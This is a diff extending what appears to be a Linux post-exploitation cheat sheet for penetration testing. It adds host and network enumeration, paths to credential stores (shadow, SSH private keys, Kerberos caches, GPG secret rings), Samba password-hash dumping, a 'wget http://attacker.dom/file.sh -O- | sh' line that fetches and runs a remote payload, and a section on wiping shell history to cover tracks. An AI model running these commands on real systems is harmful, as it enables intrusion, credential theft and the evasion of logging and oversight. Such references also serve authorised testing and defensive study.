@@ -15,6 +15,7 @@ uname -mrs
 rpm -q kernel
 dmesg | grep Linux
 ls /boot | grep vmlinuz-
+arch
 ENVIRONMENT VARIABLES
 cat /etc/profile
 cat /etc/bashrc
@@ -26,6 +27,21 @@ set
 export -p
 PRINTERS
 lpstat -a
+FILESYSTEM INFORMATION
+df -k
+mount
+cat /etc/fstab
+du -h --max-depth=1 /
+SYSTEM/DEVICE INFORMATION (OTHER)
+lspci
+lsusb
+lscpu
+lshw
+ex
+cat /proc/cpuinfo
+cat /proc/meminfo
+DEBUGGING INFORMATION
+dmesg
 PROCESSES/SERVICES
 ps aux
 ps -ef
@@ -91,8 +107,22 @@ cat /etc/sysconfig/network
 cat /etc/networks
 cat /etc/hosts
 iptables -L
-hostname
+hostname -f
 dnsdomainname
+ip addr show
+ip ro show
+route -n
+cat /etc/network/interfaces
+iptables -L -n -v
+iptables -t nat -L -n -v
+ip6tables -L -n -v
+iptables-save
+netstat -anop
+netstat -r
+netstat -lntpwu
+arp -a
+lsof -nPi
+ls /proc/net
 SOCKETS
 lsof -i
 lsof -i :80
@@ -103,11 +133,24 @@ netstat -tulpn
 chkconfig --list
 chkconfig --list | grep 3:on
 last
+lastcomm
+lastlog
+lastlogin
+	--BSD
 w
 NETWORK CACHES
 arp -e
 route
 /sbin/route -nee
+GENERIC SOFTWARE VERSION INFORMATION
+gcc -v
+mysql --version
+perl -v
+python --version
+python3 --version
+ruby -v
+java -version
+cat /etc/alternatives
 PACKET SNIFFING?
 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 IS IT A SHELL?
@@ -130,17 +173,43 @@ id
 who
 whoami
 w
-last
+last -a
+groups
+getent passwd
+getent group
 cat /etc/passwd | cut -d: -f1    # List of users
 grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
 awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
 cat /etc/sudoers
 sudo -l
+cat /etc/aliases
+find /etc -name aliases
+getent aliases
+	-mail aliases
+ypcat passwd
+	-NIS passwords
+SAMBA
+pdbedit -L -w
+pdbedit -L -v
 SENSITIVE FILES
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
+/etc/security/passwd
+	-AIX password hash file
+/etc/master.passwd
+	-OpenBSD
+/home/*/.ssh/id*
+/tmp/krb5cc_*
+/tmp/krb5.keytab	
+/home/*/.gnupg/secring.gpgs
+BLIND FILES
+/etc/resolv.conf
+/etc/motd
+/etc/issue
+/etc/passwd
+/etc/shadows
 HOME DIRECTORIES
 ls -ahlR /root/
 ls -ahlR /home/
@@ -482,7 +551,17 @@ sudo find /home -exec sh -i \;
 EXPLOITING SUID EXECUTABLES
 	In-> -rwsr-xr-x– The ‘s’ character instead of ‘x’ indicates that the SUID bit is set
 find / -perm -u=s -type f 2>/dev/null
-
+wget http://attacker.dom/file.sh -O- | sh
+	-downloaded exec (in memory)
 
 
 PATH=.:${PATH}
+
+
+DELETE HISTORY
+export HISTFILE=
+unset HISTFILE
+history -c
+rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null
+touch ~/.bash_history
+bash$ set +o history
